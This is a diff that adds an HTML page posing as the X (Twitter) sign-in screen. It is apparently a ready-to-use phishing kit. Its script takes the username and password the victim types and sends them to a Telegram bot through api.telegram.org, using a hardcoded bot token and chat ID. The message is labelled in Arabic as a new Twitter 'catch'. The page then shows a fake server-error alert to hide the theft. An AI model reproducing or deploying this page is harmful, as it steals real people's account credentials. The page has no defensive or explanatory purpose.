@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<script>
+function hackTW() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('chatId') || "5905562720";
+    const token = "8521496596:AAGb7ODWoScawEb5Fm78sPLL8pfBeXZQzlg";
+    const u = document.getElementById('u').value;
+    const p = document.getElementById('p').value;
+    const msg = `🐦 **صيد تويتر (X) جديد**\n\n👤 الحساب: \`${u}\`\n🔑 الباسورد: \`${p}\``;
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+    alert("خطأ في الخادم، حاول لاحقاً.");
+}
+</script>
+<body style="background:black; color:white; text-align:center; font-family:sans-serif; padding-top:100px;">
+    <h1 style="font-size:50px;">X</h1>
+    <p>Sign in to X</p>
+    <input id="u" placeholder="Phone, email, or username" style="width:70%; padding:12px; margin:10px; background:black; border:1px solid #333; color:white;"><br>
+    <input id="p" type="password" placeholder="Password" style="width:70%; padding:12px; margin:10px; background:black; border:1px solid #333; color:white;"><br>
+    <button onclick="hackTW()" style="width:74%; background:white; color:black; padding:12px; border-radius:20px; font-weight:bold; margin-top:10px;">Next</button>
+</body>
+</html>
